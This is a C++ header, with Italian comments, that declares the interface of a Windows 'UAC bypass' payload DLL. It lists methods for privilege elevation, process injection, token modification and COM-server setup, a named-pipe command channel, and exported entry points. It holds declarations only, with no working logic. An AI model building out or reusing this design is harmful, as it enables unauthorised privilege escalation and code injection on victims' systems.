#ifndef UAC_BYPASS_PAYLOAD_DLL_H
#define UAC_BYPASS_PAYLOAD_DLL_H

#include <windows.h>
#include "Logger.h"
#include "Config.h"

namespace uac_bypass {

// Struttura per i dati di comunicazione con il processo principale
#pragma pack(push, 1)
struct PayloadData {
    DWORD processId;
    DWORD parentId;
    WCHAR targetPath[MAX_PATH];
    WCHAR commandLine[MAX_PATH];
    bool requireElevation;
    bool cleanupRequired;
};
#pragma pack(pop)

// Classe per la gestione del payload DLL
class PayloadDLL {
public:
    static PayloadDLL& getInstance();
    
    // Funzioni di inizializzazione
    bool initialize();
    void cleanup();
    
    // Funzioni di elevazione
    bool elevatePrivileges();
    bool injectIntoTarget(HANDLE hProcess);
    bool createElevatedProcess(const std::wstring& commandLine);
    
    // Funzioni di comunicazione
    bool sendStatus(DWORD status);
    bool receiveCommands();
    
private:
    PayloadDLL();  // Singleton
    ~PayloadDLL();
    
    PayloadDLL(const PayloadDLL&) = delete;
    PayloadDLL& operator=(const PayloadDLL&) = delete;
    
    // Funzioni interne
    bool setupCOMServer();
    bool createPipe();
    bool modifyToken(HANDLE hToken);
    bool bypassUAC();
    
    // Funzioni di utilità
    bool verifyIntegrity();
    bool checkParentProcess();
    bool validateEnvironment();
    
    // Membri
    Logger& logger;
    bool initialized;
    HANDLE hPipe;
    PayloadData data;
    
    // Costanti
    static const DWORD PIPE_BUFFER_SIZE = 4096;
    static const DWORD PIPE_TIMEOUT = 5000;
    static const WCHAR* PIPE_NAME;
};

// Funzioni esportate dalla DLL
extern "C" {
    __declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
    __declspec(dllexport) BOOL WINAPI Initialize();
    __declspec(dllexport) BOOL WINAPI Elevate();
    __declspec(dllexport) BOOL WINAPI Cleanup();
}

} // namespace uac_bypass

#endif // UAC_BYPASS_PAYLOAD_DLL_H